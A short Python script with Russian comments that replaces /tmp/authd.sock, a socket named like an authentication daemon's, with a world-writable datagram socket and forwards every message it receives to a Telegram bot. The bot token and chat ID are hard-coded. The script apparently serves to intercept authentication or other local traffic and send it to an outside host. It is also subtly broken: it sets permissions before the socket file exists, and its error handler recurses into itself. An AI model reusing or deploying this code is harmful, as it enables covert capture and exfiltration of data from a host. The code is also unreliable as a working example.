import socket
import requests
import os

# Установите ваш токен бота и chat_id
bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Замените на ваш токен
chat_id = '-1002403648422'  # Замените на ваш chat_id

# URL для отправки сообщения в Telegram
TELEGRAM_API_URL = f'https://api.telegram.org/bot{bot_token}/sendMessage'

def send_to_telegram(message):
    """Отправка сообщения в Telegram."""
    payload = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(TELEGRAM_API_URL, data=payload)
        if response.status_code == 200:
            print("Message sent successfully.")
        else:
            print(f"Error sending message: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        send_to_telegram(f"Error sending to Telegram: {e}")

def create_socket():
    """Создание сокета с необходимыми правами."""
    socket_path = "/tmp/authd.sock"
    
    # Удаляем старый сокет, если существует
    if os.path.exists(socket_path):
        print(f"Socket {socket_path} exists, removing...")
        os.remove(socket_path)

    # Создаем новый сокет
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)

    # Устанавливаем права доступа для сокета (например, 0o777)
    os.chmod(socket_path, 0o777)  # Устанавливаем права доступа (если требуется)

    # Устанавливаем сокет в неблокирующий режим
    sock.setblocking(False)
    
    try:
        sock.bind(socket_path)  # Привязываем сокет к файлу
        print(f"Socket bound to {socket_path}")
    except OSError as e:
        print(f"Error binding socket: {e}")
        send_to_telegram(f"Error binding socket: {e}")
        raise
    
    return sock

def listen_on_socket():
    """Прослушивание сокета и отправка данных в Telegram."""
    # Создаем сокет
    sock = create_socket()
    
    # Сообщаем в консоль, что скрипт работает
    print("Script is running and listening on socket...")

    # Сообщение о запуске в Telegram
    send_to_telegram("Script is running and listening on socket...")

    while True:
        try:
            # Неблокирующий прием данных
            try:
                data, addr = sock.recvfrom(1024)  # Чтение данных
                if data:
                    message = f"Received data: {data.decode('utf-8')}"
                    send_to_telegram(message)  # Отправляем в Telegram
            except BlockingIOError:
                pass  # Просто пропускаем блокировку, если нет данных

        except Exception as e:
            print(f"Error: {e}")
            send_to_telegram(f"Error: {e}")
        except KeyboardInterrupt:
            print("Exiting...")
            send_to_telegram("Exiting...")
            break

if __name__ == "__main__":
    listen_on_socket()
